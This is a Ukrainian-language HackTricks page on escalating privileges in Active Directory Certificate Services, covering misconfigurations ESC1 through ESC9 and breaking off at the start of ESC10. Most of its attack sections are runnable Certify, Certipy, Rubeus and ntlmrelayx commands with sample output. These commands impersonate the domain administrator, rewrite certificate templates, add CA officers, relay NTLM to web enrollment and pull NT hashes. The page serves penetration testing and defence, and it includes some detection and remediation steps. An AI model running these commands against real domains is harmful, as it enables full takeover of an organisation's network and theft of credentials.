# Підвищення привілегій в домені AD CS

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію в рекламі на HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

**Це підсумок розділів про техніки підвищення привілегій з публікацій:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Неправильно налаштовані шаблони сертифікатів - ESC1

### Пояснення

### Пояснення неправильно налаштованих шаблонів сертифікатів - ESC1

* **Права на реєстрацію надаються користувачам з низькими привілегіями підприємства CA.**
* **Не потрібне схвалення менеджера.**
* **Не потрібні підписи від авторизованого персоналу.**
* **Дескриптори безпеки на шаблонах сертифікатів дуже дозволяють, що дозволяє користувачам з низькими привілегіями отримувати права на реєстрацію.**
* **Шаблони сертифікатів налаштовані для визначення EKU, які сприяють аутентифікації:**
* Ідентифікатори Extended Key Usage (EKU), такі як Аутентифікація клієнта (OID 1.3.6.1.5.5.7.3.2), PKINIT Аутентифікація клієнта (1.3.6.1.5.2.3.4), Вхід за допомогою смарт-карти (OID 1.3.6.1.4.1.311.20.2.2), Будь-яка мета (OID 2.5.29.37.0) або без EKU (SubCA) включені.
* **Можливість включення subjectAltName в запит на підпис сертифіката (CSR) дозволена шаблоном:**
* Активний каталог (AD) надає пріоритет subjectAltName (SAN) в сертифікаті для перевірки ідентичності, якщо він присутній. Це означає, що, вказавши SAN в CSR, можна запросити сертифікат для імітації будь-якого користувача (наприклад, адміністратора домену). Чи може запитувач вказати SAN, вказано в об'єкті AD шаблону сертифіката через властивість `mspki-certificate-name-flag`. Ця властивість є бітовою маскою, і наявність прапорця `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє запитувачу вказати SAN.

{% hint style="danger" %}
Налаштування дозволяє користувачам з низькими привілегіями запитувати сертифікати з будь-яким SAN на вибір, що дозволяє аутентифікацію як будь-якого доменного принципала через Kerberos або SChannel.
{% endhint %}

Ця функція іноді активується для підтримки миттєвого створення HTTPS або хост-сертифікатів продуктами або службами розгортання, або через відсутність розуміння.

Зауважується, що створення сертифіката з цією опцією викликає попередження, що не відбувається у випадку, коли існуючий шаблон сертифіката (наприклад, шаблон `WebServer`, у якому ввімкнено `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) дублюється, а потім змінюється для включення аутентифікаційного OID. 

### Зловживання

Для **пошуку вразливих шаблонів сертифікатів** можна виконати:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Для **зловживання цією вразливістю для імітації адміністратора** можна виконати:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Потім ви можете перетворити згенерований **сертифікат у формат `.pfx`** та використовувати його для **аутентифікації за допомогою Rubeus або certipy** знову:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows-бінарні файли "Certreq.exe" та "Certutil.exe" можуть бути використані для генерації PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Енумерація шаблонів сертифікатів у схемі конфігурації AD Forest, зокрема тих, які не потребують схвалення або підписів, мають EKU для аутентифікації клієнта або Smart Card Logon, та з увімкненим прапорцем `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, може бути виконана за допомогою запуску наступного LDAP-запиту:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Неправильно налаштовані шаблони сертифікатів - ESC2

### Пояснення

Другий сценарій зловживання є варіацією першого:

1. Права на реєстрацію надаються користувачам з низькими привілеями підприємства CA.
2. Вимога щодо схвалення менеджером вимкнена.
3. Пропущена потреба в авторизованих підписах.
4. Надто дозвільний дескриптор безпеки на шаблоні сертифіката надає права на реєстрацію сертифікатів користувачам з низькими привілеями.
5. **Шаблон сертифіката визначено для включення EKU для будь-якої мети або без EKU.**

**EKU для будь-якої мети** дозволяє отримати сертифікат зловмиснику для **будь-якої мети**, включаючи аутентифікацію клієнта, аутентифікацію сервера, підписування коду тощо. Той самий **підхід, що використовується для ESC3**, може бути використаний для експлуатації цього сценарію.

Сертифікати з **відсутністю EKU**, які діють як сертифікати підпорядкованого ЦС, можуть бути використані для **будь-якої мети** і також можуть **використовуватися для підпису нових сертифікатів**. Таким чином, зловмисник може вказати довільні EKU або поля в нових сертифікатах, використовуючи сертифікат підпорядкованого ЦС.

Однак нові сертифікати, створені для **аутентифікації домену**, не будуть працювати, якщо сертифікат підпорядкованого ЦС не є довіреним об'єктом **`NTAuthCertificates`**, що є налаштуванням за замовчуванням. Тим не менш, зловмисник все ще може створювати **нові сертифікати з будь-яким EKU** та довільними значеннями сертифікатів. Це може бути потенційно **зловживано** для широкого спектру цілей (наприклад, підписування коду, аутентифікація сервера тощо) та може мати значущі наслідки для інших додатків в мережі, таких як SAML, AD FS або IPSec.

Для переліку шаблонів, які відповідають цьому сценарію в схемі конфігурації лісу AD, можна виконати наступний запит LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Неправильно налаштовані шаблони агента реєстрації - ESC3

### Пояснення

Цей сценарій схожий на перший і другий, але **зловживає** **іншим EKU** (Агент запиту сертифіката) та **2 різними шаблонами** (тому має 2 набори вимог),

**EKU агента запиту сертифіката** (OID 1.3.6.1.4.1.311.20.2.1), відомий як **Агент реєстрації** в документації Microsoft, дозволяє принципалу **реєструватися** для отримання **сертифіката від імені іншого користувача**.

**"Агент реєстрації"** реєструється в такому **шаблоні** та використовує отриманий **сертифікат для спільного підпису CSR від імені іншого користувача**. Потім **надсилає** спільно підписаний CSR до ЦС, реєструючись в **шаблоні**, який **дозволяє "реєструватися від імені"**, і ЦС відповідає **сертифікатом, що належить "іншому" користувачеві**.

**Вимоги 1:**

- Права на реєстрацію надаються користувачам з низькими привілеями підприємства ЦС.
- Вимога щодо схвалення менеджера відсутня.
- Немає вимоги до авторизованих підписів.
- Дескриптор безпеки шаблону сертифіката надто дозволяючий, надаючи права на реєстрацію користувачам з низькими привілеями.
- Шаблон сертифіката включає EKU агента запиту сертифіката, що дозволяє запит інших шаблонів сертифікатів від імені інших принципалів.

**Вимоги 2:**

- Підприємство ЦС надає права на реєстрацію користувачам з низькими привілеями.
- Обхід схвалення менеджера.
- Версія схеми шаблону - 1 або перевищує 2, і вказує вимогу видачі політики застосування, яка потребує EKU агента запиту сертифіката.
- EKU, визначений у шаблоні сертифіката, дозволяє аутентифікацію домену.
- Обмеження для агентів реєстрації не застосовуються на ЦС.

### Зловживання

Ви можете використовувати [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy) для зловживання цим сценарієм:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Користувачі**, які мають право **отримати** сертифікат агента реєстрації, шаблони, в яких агенти реєстрації можуть реєструватися, та **облікові записи**, від імені яких може діяти агент реєстрації, можуть бути обмежені підприємственими ЦС. Це досягається шляхом відкриття `certsrc.msc` **snap-in**, **клацнувши правою кнопкою миші на ЦС**, **клацнувши Властивості**, а потім переходячи на вкладку "Агенти реєстрації".

Проте відзначено, що **типове** налаштування для ЦС - "Не обмежувати агентів реєстрації". Коли обмеження на агентів реєстрації увімкнено адміністраторами, встановивши його на "Обмежити агентів реєстрації", типова конфігурація залишається дуже дозвільною. Це дозволяє **Кожному** мати доступ до реєстрації в усіх шаблонах як будь-хто.

## Керування доступом до вразливих шаблонів сертифікатів - ESC4

### **Пояснення**

**Дескриптор безпеки** на **шаблонах сертифікатів** визначає **дозволи**, які мають конкретні **принципали AD** щодо шаблону.

Якщо **атакуючий** має необхідні **дозволи** для **зміни** **шаблону** та **впровадження** будь-яких **експлуатованих помилок конфігурації**, описаних у **попередніх розділах**, може бути сприяно підвищенню привілеїв.

Значущі дозволи, які застосовуються до шаблонів сертифікатів, включають:

- **Власник:** Надає неявний контроль над об'єктом, що дозволяє змінювати будь-які атрибути.
- **Повний контроль:** Дозволяє повний контроль над об'єктом, включаючи можливість змінювати будь-які атрибути.
- **ЗаписВласника:** Дозволяє змінювати власника об'єкта на принципала під контролем атакуючого.
- **ЗаписDacl:** Дозволяє налаштовувати контроль доступу, що потенційно надає атакуючому Повний контроль.
- **ЗаписВластивість:** Дозволяє редагувати будь-які властивості об'єкта.

### Зловживання

Приклад підвищення привілеїв, подібний попередньому:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 - коли у користувача є права на запис до шаблону сертифіката. Це, наприклад, може бути використано для перезапису конфігурації шаблону сертифіката, щоб зробити шаблон вразливим до ESC1.

Як ми бачимо вище, лише `JOHNPC` має ці дозволи, але наш користувач `JOHN` має новий край `AddKeyCredentialLink` до `JOHNPC`. Оскільки ця техніка пов'язана з сертифікатами, я також реалізував цей атаку, який відомий як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ось невеликий погляд на команду `shadow auto` Certipy для отримання NT-хешу жертви.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** може перезаписати конфігурацію шаблону сертифіката однією командою. За **замовчуванням**, Certipy перезапише конфігурацію, щоб зробити її **вразливою для ESC1**. Ми також можемо вказати параметр **`-save-old` для збереження старої конфігурації**, що буде корисним для **відновлення** конфігурації після нашого нападу.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Вразливий доступ до об'єктів керування об'єктами PKI - ESC5

### Пояснення

Обширна мережа взаємопов'язаних відносин на основі ACL, яка включає кілька об'єктів поза шаблонами сертифікатів та центром сертифікації, може вплинути на безпеку всієї системи AD CS. Ці об'єкти, які можуть значно вплинути на безпеку, охоплюють:

* Об'єкт комп'ютера AD сервера ЦС, який може бути скомпрометований через механізми, такі як S4U2Self або S4U2Proxy.
* Сервер RPC/DCOM сервера ЦС.
* Будь-який нащадок об'єкта або контейнер AD всередині конкретного шляху контейнера `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях включає, але не обмежується контейнерами та об'єктами, такими як контейнери шаблонів сертифікатів, контейнери центрів сертифікації, об'єкт NTAuthCertificates та контейнер служб реєстрації.

Безпеку системи PKI можна скомпрометувати, якщо низькопривілейований атакувальник зможе отримати контроль над будь-якими з цих критичних компонентів.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Пояснення

Тема, яка обговорюється в [**пості CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), також торкається наслідків прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, які описані Microsoft. Ця конфігурація, коли вона активована на Центрі сертифікації (ЦС), дозволяє включення **користувацьких значень** в **альтернативне ім'я суб'єкта** для **будь-якого запиту**, включаючи ті, що створені з Active Directory®. Внаслідок цього ця можливість дозволяє **зловмиснику** записатися через **будь-який шаблон**, налаштований для доменної **аутентифікації**—зокрема ті, що відкриті для запису користувачів з **непривілейованим** доступом, наприклад, стандартний шаблон користувача. В результаті сертифікат може бути захищений, що дозволяє зловмиснику аутентифікуватися як адміністратор домену або **будь-яка інша активна сутність** всередині домену.

**Примітка**: Підхід до додавання **альтернативних імен** в запит на підпис сертифіката (CSR), через аргумент `-attrib "SAN:"` в `certreq.exe` (відомий як "Пари імен Значень"), представляє **контраст** від стратегії експлуатації SANs в ESC1. Тут відмінність полягає в тому, **як інформація облікового запису укладена**—в межах атрибуту сертифіката, а не розширення. 

### Зловживання

Для перевірки активації налаштування організації можуть скористатися наступною командою з `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ця операція в основному використовує **віддалений доступ до реєстру**, отже, альтернативним підходом може бути:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Інструменти, такі як [**Certify**](https://github.com/GhostPack/Certify) та [**Certipy**](https://github.com/ly4k/Certipy), можуть виявити цю неправильну конфігурацію та використовувати її:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Для зміни цих налаштувань, припускаючи, що у вас є **адміністративні** права домену або їм еквівалентні, можна виконати наступну команду з будь-якої робочої станції:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Щоб вимкнути цю конфігурацію у вашому середовищі, прапорець можна видалити за допомогою:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Після оновлення забезпечення в травні 2022 року, нові видані **сертифікати** будуть містити **розширення безпеки**, яке включає **властивість `objectSid` запитувача**. Для ESC1 цей SID походить від вказаного SAN. Однак для **ESC6** SID відображає **`objectSid` запитувача**, а не SAN.\
Для використання ESC6 важливо, щоб система була вразливою до ESC10 (Слабкі відображення сертифікатів), яка надає перевагу **SAN над новим розширенням безпеки**.
{% endhint %}

## Вразливий контроль доступу до сертифіката авторитету - ESC7

### Атака 1

#### Пояснення

Контроль доступу до сертифіката авторитету здійснюється за допомогою набору дозволів, які регулюють дії CA. Ці дозволи можна переглянути, звернувшись до `certsrv.msc`, клацнувши правою кнопкою миші на CA, вибравши властивості, а потім перейшовши на вкладку Безпека. Крім того, дозволи можна перелічити за допомогою модуля PSPKI за допомогою команд, таких як:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Це надає відомості про основні права, а саме **`ManageCA`** та **`ManageCertificates`**, що відповідають ролям "Адміністратора CA" та "Менеджера сертифікатів" відповідно.

#### Зловживання

Маючи права **`ManageCA`** на центр сертифікації, принципал може віддалено маніпулювати налаштуваннями за допомогою PSPKI. Це включає перемикання прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`** для дозволу вказання SAN в будь-якому шаблоні, що є критичним аспектом ескалації домену.

Спрощення цього процесу можливе за допомогою командлету **Enable-PolicyModuleFlag** у PSPKI, що дозволяє внесення змін без прямої взаємодії з GUI.

Володіння правами **`ManageCertificates`** сприяє схваленню очікуючих запитів, ефективно обходячи захист "Схвалення менеджером сертифікатів CA".

Комбінацію модулів **Certify** та **PSPKI** можна використовувати для запиту, схвалення та завантаження сертифіката:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Атака 2

#### Пояснення

{% hint style="warning" %}
У **попередній атакі** використовувалися дозволи **`Manage CA`** для **увімкнення** прапорця **EDITF\_ATTRIBUTESUBJECTALTNAME2** для виконання атаки **ESC6**, але це не матиме жодного ефекту, поки службу CA (`CertSvc`) не буде перезапущено. Коли у користувача є право доступу `Manage CA`, користувач також може **перезапустити службу**. Однак це **не означає, що користувач може перезапустити службу віддалено**. Крім того, **ESC6 може не працювати зразу** у більшості оновлених середовищ через оновлення забезпечення безпеки в травні 2022 року.
{% endhint %}

Отже, тут представлена інша атака.

Передумови:

* Тільки дозвіл **`ManageCA`**
* Дозвіл **`Manage Certificates`** (може бути наданий з **`ManageCA`**)
* Шаблон сертифіката **`SubCA`** повинен бути **увімкнений** (може бути увімкнений з **`ManageCA`**)

Техніка ґрунтується на тому, що користувачі з правом доступу `Manage CA` _і_ `Manage Certificates` можуть **видавати невдалі запити на сертифікати**. Шаблон сертифіката **`SubCA`** **уразливий на ESC1**, але **тільки адміністратори** можуть зареєструватися в шаблоні. Таким чином, **користувач** може **запросити** зареєструватися в **`SubCA`** - що буде **відхилено** - але **потім видано менеджером пізніше**.

#### Зловживання

Ви можете **надати собі доступ до `Manage Certificates`**, додавши свого користувача як нового посадовця.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Шаблон **`SubCA`** можна **увімкнути на CA** за допомогою параметра `-enable-template`. За замовчуванням шаблон `SubCA` увімкнено.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Якщо ми виконали передумови для цього нападу, ми можемо почати, **запитавши сертифікат на основі шаблону `SubCA`**.

**Цей запит буде відхилений**, але ми збережемо приватний ключ та зафіксуємо ідентифікатор запиту.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
З нашими **`Керування CA` та `Керування сертифікатами`**, ми можемо **видати неуспішний запит на сертифікат** за допомогою команди `ca` та параметра `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
І, нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` та параметра `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay на HTTP-точки доступу AD CS - ESC8

### Пояснення

{% hint style="info" %}
У середовищах, де встановлено **AD CS**, якщо існує **уразлива кінцева точка веб-реєстрації** та щонайменше один **шаблон сертифіката опублікований**, який дозволяє **реєстрацію доменного комп'ютера та аутентифікацію клієнта** (такий як типовий **`Machine`** шаблон), стає можливим **компрометування будь-якого комп'ютера з активним службою спулера атакуючим**!
{% endhint %}

Декілька **методів реєстрації на основі HTTP** підтримуються AD CS, доступні через додаткові ролі сервера, які адміністратори можуть встановити. Ці інтерфейси для реєстрації сертифікатів на основі HTTP піддаються **атакам перенаправлення NTLM**. Атакуючий, з **компрометованого комп'ютера, може видаавати будь-який обліковий запис AD, який аутентифікується через вхідний NTLM**. Під час видачі облікового запису жертви, ці веб-інтерфейси можуть бути доступні атакуючому для **запиту сертифікату аутентифікації клієнта за допомогою шаблонів сертифікатів `User` або `Machine`**.

* **Інтерфейс веб-реєстрації** (стародавня ASP-додаток, доступний за адресою `http://<caserver>/certsrv/`), за замовчуванням використовує лише HTTP, що не забезпечує захист від атак перенаправлення NTLM. Крім того, він явно дозволяє лише аутентифікацію NTLM через свій заголовок HTTP авторизації, що робить більш безпечні методи аутентифікації, такі як Kerberos, непридатними.
* **Служба реєстрації сертифікатів** (CES), **Служба політики реєстрації сертифікатів** (CEP) та **Служба реєстрації мережевих пристроїв** (NDES) за замовчуванням підтримують переговорну аутентифікацію через свій заголовок HTTP авторизації. Переговорна аутентифікація **підтримує як** Kerberos, так і **NTLM**, дозволяючи атакуючому **знизити рівень до аутентифікації NTLM** під час атак перенаправлення. Хоча ці веб-сервіси за замовчуванням підтримують HTTPS, саме HTTPS **не захищає від атак перенаправлення NTLM**. Захист від атак перенаправлення NTLM для служб HTTPS можливий лише тоді, коли HTTPS поєднано з прив'язкою каналу. На жаль, AD CS не активує Розширену захист для аутентифікації на IIS, яка необхідна для прив'язки каналу.

Однією зі спільних **проблем** з атаками перенаправлення NTLM є **короткий термін сесій NTLM** та неможливість атакуючого взаємодіяти з сервісами, які **вимагають підпису NTLM**.

Тим не менш, це обмеження подолано за допомогою атаки перенаправлення NTLM для отримання сертифіката для користувача, оскільки термін дії сертифіката визначає тривалість сесії, і сертифікат може бути використаний з сервісами, які **вимагають підпису NTLM**. Щоб отримати інструкції з використанням вкраденого сертифіката, див.:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Ще одним обмеженням атак перенаправлення NTLM є те, що **комп'ютер, підконтрольний атакуючому, повинен бути аутентифікований обліковим записом жертви**. Атакуючий може чекати або спробувати **примусити** цю аутентифікацію:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Зловживання**

[**Certify**](https://github.com/GhostPack/Certify) `cas` перераховує **увімкнені HTTP-точки доступу AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Властивість `msPKI-Enrollment-Servers` використовується корпоративними центрами сертифікації (CAs) для зберігання кінцевих точок служби реєстрації сертифікатів (CES). Ці кінцеві точки можна розібрати та перерахувати, використовуючи інструмент **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### Зловживання Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Зловживання з [Certipy](https://github.com/ly4k/Certipy)

Запит на отримання сертифіката за замовчуванням виконується Certipy на основі шаблону `Machine` або `User`, визначеного залежно від того, закінчується чи не ім'я облікового запису на `$`. Вказання альтернативного шаблону можливо за допомогою параметра `-template`.

Техніка, подібна до [PetitPotam](https://github.com/ly4k/PetitPotam), може бути використана для примусової аутентифікації. При роботі з контролерами домену, необхідно вказати `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Немає розширення безпеки - ESC9 <a href="#5485" id="5485"></a>

### Пояснення

Нове значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, відоме як ESC9, запобігає вбудовуванню **нового розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`** в сертифікат. Цей прапор стає важливим, коли `StrongCertificateBindingEnforcement` встановлено на `1` (за замовчуванням), що відрізняється від налаштування `2`. Його значення підвищується в сценаріях, де може бути використано слабке відображення сертифікатів для Kerberos або Schannel (як у ESC10), оскільки відсутність ESC9 не змінила б вимог.

Умови, при яких налаштування цього прапорця стає значущим, включають:
- `StrongCertificateBindingEnforcement` не налаштовано на `2` (за замовчуванням налаштування `1`), або `CertificateMappingMethods` включає прапорець `UPN`.
- Сертифікат позначений прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` в налаштуванні `msPKI-Enrollment-Flag`.
- Сертифікат вказує будь-яку EKU аутентифікації клієнта.
- Є доступ до `GenericWrite` дозволів на будь-який обліковий запис для компрометації іншого.

### Сценарій зловживання

Припустимо, що `John@corp.local` має дозвіл `GenericWrite` на `Jane@corp.local`, з метою компрометації `Administrator@corp.local`. Шаблон сертифіката `ESC9`, в який має право записуватися `Jane@corp.local`, налаштований з прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` в налаштуванні `msPKI-Enrollment-Flag`.

Спочатку хеш `Jane` отримується за допомогою тіньових облікових даних, завдяки `GenericWrite` `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Пізніше `userPrincipalName` `Jane` змінено на `Administrator`, усвідомлено пропускаючи частину домену `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ця модифікація не порушує обмежень, оскільки `Administrator@corp.local` залишається відмінним як `userPrincipalName` `Administrator`.

Після цього, шаблон сертифіката `ESC9`, позначений як вразливий, запитується як `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Це зауважено, що `userPrincipalName` сертифіката відображає `Administrator`, позбавлений будь-якого "object SID".

`userPrincipalName` `Jane` потім повертається до її оригінального значення, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Спроба аутентифікації за допомогою виданого сертифіката тепер видає NT-хеш `Administrator@corp.local`. Команда повинна включати `-domain <domain>`, оскільки в сертифікаті відсутня специфікація домену:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Слабкі відображення сертифікатів - ESC10

### Пояснення

Два значення ключів реєстру на контролері домену згадуються ESC10:

- Значення за замовчуванням для `CertificateMappingMethods` під `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` - `0x18` (`0x8 | 0x10`), раніше встановлене на `0x1F`.
